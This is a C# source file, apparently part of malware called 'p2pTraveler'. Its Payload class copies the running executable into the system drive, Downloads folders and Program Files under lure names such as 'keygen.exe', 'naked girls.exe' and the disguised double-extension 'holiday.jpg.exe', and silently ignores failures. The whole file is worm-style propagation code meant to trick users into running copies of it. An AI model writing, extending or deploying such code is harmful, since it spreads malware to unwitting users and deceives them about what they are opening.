using System;
using System.Collections.Generic;
using System.IO;

namespace p2pTraveler
{
    public class Payload
    {
        public static void CreateFiles(string currentFile)
        {
            var architecture = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
        
            var locations = new List<string>();
            locations.Add(Environment.GetEnvironmentVariable("SystemDrive"));
            locations.Add(Path.Combine(Environment.GetEnvironmentVariable("SystemDrive"),"\\Download"));
            locations.Add(Path.Combine(Environment.GetEnvironmentVariable("SystemDrive"), "\\Downloads"));
            locations.Add(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"));
            if (architecture == "AMD64")
                locations.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
            locations.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));

            var currentFileName = Strings.Reverse(Strings.Reverse(currentFile).Substring(0,Strings.Reverse(currentFile).IndexOf("\\", System.StringComparison.Ordinal)));

            var newFileNames = new List<string>();
            newFileNames.Add("p2pTraveler.exe");
            newFileNames.Add("Run Me.exe");
            newFileNames.Add("Cool Game.exe");
            newFileNames.Add("keygen.exe");
            newFileNames.Add("foo.exe");
            newFileNames.Add("bar.exe");
            newFileNames.Add("download.exe");
            newFileNames.Add("cool.exe");
            newFileNames.Add("naked girls.exe");
            newFileNames.Add("boobs.exe");
            newFileNames.Add("lol.exe");
            newFileNames.Add("holiday.jpg.exe");

            // Loop through all locations
            foreach (var location in locations)
            {
                // And every name
                foreach (var filename in newFileNames)
                {
                    // In case it can't do it. Like if the folder doesn't exist
                    try
                    {
                        // Copy the current application to the locations and with the names.
                        File.Copy(currentFile, location + "\\" + filename, true);    
                    }
                    catch (Exception)
                    {
                        
                        // If it fails just move on
                    }
                    
                }
                
            }
            
        }



    }
}
